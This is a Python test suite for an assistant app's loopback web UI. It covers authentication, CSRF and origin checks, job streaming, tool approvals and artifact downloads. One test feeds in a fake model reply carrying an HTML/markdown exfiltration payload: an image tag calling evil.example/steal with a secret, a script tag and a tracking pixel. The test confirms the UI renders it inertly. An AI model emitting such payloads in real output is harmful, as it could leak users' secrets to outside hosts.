"""M7 loopback UI, session, stream, approval, and artifact boundaries."""

import asyncio
import hashlib
from importlib import resources
from threading import Event
from uuid import uuid4

import httpx

from jarvis.application.conversations import ConversationService
from jarvis.application.jobs import JobRunner
from jarvis.application.tools import ToolPolicy, ToolService
from jarvis.domain.jobs import JobStatus
from jarvis.domain.tools import ToolContextRecord
from jarvis.domain.types import StreamDelta, StreamTerminal, TurnStatus
from jarvis.infrastructure.providers.fake import FakeChatProvider
from jarvis.infrastructure.sqlite_store import SqliteStore
from jarvis.interfaces.cli import parse_args
from jarvis.interfaces.web import BODY_LIMIT, create_web_app

BASE = "http://127.0.0.1:8765"


async def _open(client: httpx.AsyncClient, token: str) -> str:
    response = await client.post(
        "/api/setup", json={"token": token}, headers={"origin": BASE}
    )
    assert response.status_code == 200
    cookie = response.headers["set-cookie"].lower()
    assert "httponly" in cookie and "samesite=strict" in cookie
    return (await client.get("/api/session")).json()["csrf_token"]


def _client(app) -> httpx.AsyncClient:
    return httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url=BASE)


def test_setup_auth_host_origin_csrf_and_bounded_input(tmp_path):
    with SqliteStore(tmp_path) as store:
        service = ConversationService(store, FakeChatProvider())
        app, token = create_web_app(service, JobRunner(store, service), None, 8765)

        async def scenario():
            async with _client(app) as client:
                assert (await client.get("/api/conversations")).status_code == 401
                assert (await client.get("/api/jobs/unknown/events")).status_code == 401
                assert (
                    await client.get("/", headers={"host": "evil.test"})
                ).status_code == 400
                assert (
                    await client.post(
                        "/api/setup",
                        json={"token": token},
                        headers={"origin": "https://evil.test"},
                    )
                ).status_code == 403
                assert (
                    await client.post("/api/setup", json={"token": "wrong"})
                ).status_code == 403
                csrf = await _open(client, token)
                assert (
                    await client.post("/api/setup", json={"token": token})
                ).status_code == 403
                assert (await client.get("/")).status_code == 200
                assert (await client.get("/docs")).status_code == 404
                assert (
                    await client.post("/api/conversations", json={"title": "A"})
                ).status_code == 403
                headers = {"x-csrf-token": csrf, "origin": BASE}
                assert (
                    await client.post(
                        "/api/conversations",
                        json={"title": "A"},
                        headers={**headers, "origin": "https://evil.test"},
                    )
                ).status_code == 403
                assert (
                    await client.post(
                        "/api/conversations",
                        json={"title": "A"},
                        headers={**headers, "sec-fetch-site": "cross-site"},
                    )
                ).status_code == 403
                assert (
                    await client.post(
                        "/api/conversations",
                        json={"title": "A", "extra": "no"},
                        headers=headers,
                    )
                ).status_code == 422
                assert (
                    await client.post(
                        "/api/conversations",
                        content=b'{"title":"A","title":"B"}',
                        headers={**headers, "content-type": "application/json"},
                    )
                ).status_code == 422
                assert (
                    await client.post(
                        "/api/conversations",
                        content=b"x" * (BODY_LIMIT + 1),
                        headers={**headers, "content-type": "application/json"},
                    )
                ).status_code == 413
                assert (
                    await client.post(
                        "/api/conversations",
                        content=b"title=A",
                        headers={
                            **headers,
                            "content-type": "application/x-www-form-urlencoded",
                        },
                    )
                ).status_code == 415
                assert (
                    await client.post(
                        "/api/conversations", json={"title": "A"}, headers=headers
                    )
                ).status_code == 201
            async with _client(app) as other:
                assert (await other.get("/api/jobs")).status_code == 401

        asyncio.run(scenario())


def test_duplicate_send_stream_reconnect_and_restart_reconstructs_sqlite(tmp_path):
    with SqliteStore(tmp_path) as store:
        provider = FakeChatProvider()
        service = ConversationService(store, provider)
        runner = JobRunner(store, service)
        app, token = create_web_app(service, runner, None, 8765)

        async def scenario():
            async with _client(app) as client:
                csrf = await _open(client, token)
                headers = {"x-csrf-token": csrf, "origin": BASE}
                created = await client.post(
                    "/api/conversations", json={"title": "Persistent"}, headers=headers
                )
                conversation_id = created.json()["id"]
                path = f"/api/conversations/{conversation_id}/messages"
                first = await client.post(
                    path,
                    json={"text": "hello", "submission_id": "stable"},
                    headers=headers,
                )
                assert first.status_code == 202
                job_id = first.json()["job"]["id"]
                await runner.wait_for_idle()
                duplicate = await client.post(
                    path,
                    json={"text": "hello", "submission_id": "stable"},
                    headers=headers,
                )
                assert duplicate.status_code == 200
                assert duplicate.json()["duplicate"]
                assert duplicate.json()["job"]["id"] == job_id
                assert len(provider.requests) == 1
                changed = await client.post(
                    path,
                    json={"text": "different", "submission_id": "stable"},
                    headers=headers,
                )
                assert changed.status_code == 409
                event = await client.get(f"/api/jobs/{job_id}/events")
                assert event.status_code == 200
                assert '"status":"succeeded"' in event.text
                assert (await client.get(f"/api/jobs/{job_id}")).json()["job"][
                    "status"
                ] == "succeeded"
                history = (
                    await client.get(f"/api/conversations/{conversation_id}")
                ).json()
                assert [message["role"] for message in history["messages"]] == [
                    "user",
                    "assistant",
                ]
                return conversation_id, job_id

        conversation_id, job_id = asyncio.run(scenario())
    with SqliteStore(tmp_path) as reopened:
        service = ConversationService(reopened, FakeChatProvider())
        app, token = create_web_app(service, JobRunner(reopened, service), None, 8765)

        async def reconnect():
            async with _client(app) as client:
                await _open(client, token)
                assert (await client.get(f"/api/jobs/{job_id}")).json()["job"][
                    "status"
                ] == "succeeded"
                history = (
                    await client.get(f"/api/conversations/{conversation_id}")
                ).json()
                assert len(history["messages"]) == 2

        asyncio.run(reconnect())


def test_closing_first_tab_keeps_job_running_and_second_tab_can_cancel(tmp_path):
    started, release = Event(), Event()

    class StalledProvider(FakeChatProvider):
        def stream(self, messages, cancel, instructions=""):
            started.set()
            release.wait(3)
            yield StreamTerminal("cancelled" if cancel.is_set() else None)

    with SqliteStore(tmp_path) as store:
        service = ConversationService(store, StalledProvider())
        runner = JobRunner(store, service)
        app, token = create_web_app(service, runner, None, 8765)

        async def scenario():
            async with _client(app) as first_tab:
                csrf = await _open(first_tab, token)
                conversation_id = (
                    await first_tab.post(
                        "/api/conversations",
                        json={"title": "Two tabs"},
                        headers={"x-csrf-token": csrf},
                    )
                ).json()["id"]
                sent = await first_tab.post(
                    f"/api/conversations/{conversation_id}/messages",
                    json={"text": "wait", "submission_id": "one"},
                    headers={"x-csrf-token": csrf},
                )
                job_id = sent.json()["job"]["id"]
                cookie = first_tab.cookies.get("jarvis_session")
                assert await asyncio.to_thread(started.wait, 2)
            async with _client(app) as second_tab:
                second_tab.cookies.set("jarvis_session", cookie)
                assert (await second_tab.get(f"/api/jobs/{job_id}")).json()["job"][
                    "status"
                ] == "running"
                cancelled = await second_tab.post(
                    f"/api/jobs/{job_id}/cancel",
                    headers={"x-csrf-token": csrf, "origin": BASE},
                )
                assert cancelled.json()["job"]["status"] == "cancel_requested"
                release.set()
                await runner.wait_for_idle()
                assert (await second_tab.get(f"/api/jobs/{job_id}")).json()["job"][
                    "status"
                ] == "cancelled"

        asyncio.run(scenario())


def test_history_includes_interrupted_turn_and_saved_draft(tmp_path):
    with SqliteStore(tmp_path) as store:
        conversation = store.create_conversation("Interrupted")
        job_id = str(uuid4())
        turn, _ = store.begin_turn(conversation.id, "keep this", "one", job_id)
        started = store.start_job(job_id)
        store.checkpoint_draft(turn.id, "partial reply", started.attempt)
    with SqliteStore(tmp_path) as reopened:
        service = ConversationService(reopened, FakeChatProvider())
        app, token = create_web_app(service, JobRunner(reopened, service), None, 8765)

        async def scenario():
            async with _client(app) as client:
                await _open(client, token)
                history = (
                    await client.get(f"/api/conversations/{conversation.id}")
                ).json()
                assert history["turns"][0]["status"] == "interrupted"
                assert history["messages"][0]["text"] == "keep this"
                assert history["drafts"] == [
                    {
                        "turn_id": turn.id,
                        "text": "partial reply",
                        "status": "interrupted",
                    }
                ]

        asyncio.run(scenario())


def test_malicious_output_is_text_only_with_no_external_resource_policy(tmp_path):
    payload = '<img src="https://evil.example/steal?secret=x"><script>alert(1)</script> ![](https://evil.example/pixel)'

    class MaliciousProvider(FakeChatProvider):
        def stream(self, messages, cancel, instructions=""):
            yield StreamDelta(payload)
            yield StreamTerminal()

    with SqliteStore(tmp_path) as store:
        service = ConversationService(store, MaliciousProvider())
        runner = JobRunner(store, service)
        app, token = create_web_app(service, runner, None, 8765)

        async def scenario():
            async with _client(app) as client:
                csrf = await _open(client, token)
                created = await client.post(
                    "/api/conversations",
                    json={"title": "Untrusted"},
                    headers={"x-csrf-token": csrf},
                )
                conversation_id = created.json()["id"]
                await client.post(
                    f"/api/conversations/{conversation_id}/messages",
                    json={"text": "show", "submission_id": "one"},
                    headers={"x-csrf-token": csrf},
                )
                await runner.wait_for_idle()
                history = (
                    await client.get(f"/api/conversations/{conversation_id}")
                ).json()
                assert history["messages"][-1]["text"] == payload
                page = await client.get("/")
                csp = page.headers["content-security-policy"]
                assert "default-src 'none'" in csp
                assert "img-src 'self'" in csp
                assert "connect-src 'self'" in csp
                assert "evil.example" not in page.text
                script = (await client.get("/static/app.js")).text
                assert "textContent" in script and "innerHTML" not in script
                for filename in ("marked.umd.js", "markdown.js"):
                    asset = await client.get(f"/static/{filename}")
                    assert asset.status_code == 200
                    assert "javascript" in asset.headers["content-type"]
                    assert f"/static/{filename}" in page.text
                markdown = (await client.get("/static/markdown.js")).text
                assert "createTextNode" in markdown and "innerHTML" not in markdown
                assert (await client.get("/static/unknown.js")).status_code == 404

        asyncio.run(scenario())


def test_approval_shows_exact_action_and_is_single_use(tmp_path):
    class ClockBackend:
        calls = 0

        def inspect(self, _name, _arguments):
            return "clock-target"

        def execute(self, _name, _arguments):
            self.calls += 1
            return {"utc": "2026-10-06T00:00:00+00:00"}

    class AfterToolProvider:
        def count_prompt_tokens_with_tools(self, _messages, _instructions, _tools):
            return 100

        def stream_with_tools(self, messages, _cancel, _instructions, _tools):
            assert any(isinstance(item, ToolContextRecord) for item in messages)
            yield StreamDelta("Approved read complete.")
            yield StreamTerminal()

    with SqliteStore(tmp_path) as store:
        backend = ClockBackend()
        tool_service = ToolService(
            store, backend, ToolPolicy(approval_required=frozenset({"current_time"}))
        )
        service = ConversationService(
            store, AfterToolProvider(), tool_service=tool_service
        )
        runner = JobRunner(store, service)
        conversation = store.create_conversation("Approval")
        job_id = str(uuid4())
        turn, _ = store.begin_turn(conversation.id, "time", "one", job_id)
        started = store.start_job(job_id)
        invocation = store.record_tool_proposal(
            turn.id,
            "call",
            "current_time",
            1,
            "{}",
            hashlib.sha256(b"{}").hexdigest(),
            "m5-v1",
            "clock-target",
            "approval",
            started.attempt,
        )
        store.mark_job_waiting(job_id)
        app, token = create_web_app(service, runner, tool_service, 8765)

        async def scenario():
            async with _client(app) as client:
                csrf = await _open(client, token)
                items = (await client.get("/api/approvals")).json()["approvals"]
                assert len(items) == 1
                assert items[0]["invocation_id"] == invocation.id
                assert items[0]["name"] == "current_time"
                assert items[0]["arguments"] == "{}"
                assert items[0]["target"] == "clock-target"
                path = f"/api/approvals/{invocation.id}/approve"
                assert (await client.post(path)).status_code == 403
                approved = await client.post(
                    path, headers={"x-csrf-token": csrf, "origin": BASE}
                )
                assert approved.status_code == 202
                await runner.wait_for_idle()
                assert backend.calls == 1
                assert store.get_job(job_id).status is JobStatus.SUCCEEDED
                assert store.get_turn(turn.id).status is TurnStatus.COMPLETE
                assert (
                    await client.post(path, headers={"x-csrf-token": csrf})
                ).status_code == 409
                assert (await client.get("/api/approvals")).json()["approvals"] == []

        asyncio.run(scenario())


def test_artifact_route_is_authenticated_verified_and_attachment_only(tmp_path):
    with SqliteStore(tmp_path) as store:
        conversation = store.create_conversation("Artifact")
        job_id = str(uuid4())
        turn, _ = store.begin_turn(conversation.id, "file", "one", job_id)
        started = store.start_job(job_id)
        store.complete_turn(turn.id, "saved", started.attempt)
        relative = f"artifacts/{job_id}/fixture.txt"
        target = tmp_path / relative
        target.parent.mkdir(parents=True)
        target.write_bytes(b"private fixture")
        digest = hashlib.sha256(target.read_bytes()).hexdigest()
        store.run_sync(
            lambda: store._conn.execute(
                "INSERT INTO artifacts (id, job_id, relative_path, kind, size_bytes, "
                "sha256, status, created_at) VALUES ('fixture', ?, ?, 'fixture', ?, ?, "
                "'available', 'now')",
                (job_id, relative, target.stat().st_size, digest),
            )
        )
        service = ConversationService(store, FakeChatProvider())
        app, token = create_web_app(service, JobRunner(store, service), None, 8765)

        async def scenario():
            async with _client(app) as client:
                assert (await client.get("/api/artifacts/fixture")).status_code == 401
                await _open(client, token)
                served = await client.get("/api/artifacts/fixture")
                assert served.content == b"private fixture"
                assert served.headers["content-type"] == "application/octet-stream"
                assert "attachment" in served.headers["content-disposition"]
                assert (await client.get("/api/artifacts/missing")).status_code == 404
                target.write_bytes(b"tampered")
                assert (await client.get("/api/artifacts/fixture")).status_code == 404

        asyncio.run(scenario())


def test_web_command_is_explicit_loopback_only_and_static_assets_are_packaged():
    args = parse_args(["--data-dir", "temporary", "web", "--port", "8765"])
    assert args.command == "web" and args.port == 8765
    package = resources.files("jarvis").joinpath("interfaces", "static")
    assert all(
        package.joinpath(name).is_file()
        for name in ("index.html", "setup.html", "app.js", "app.css")
    )
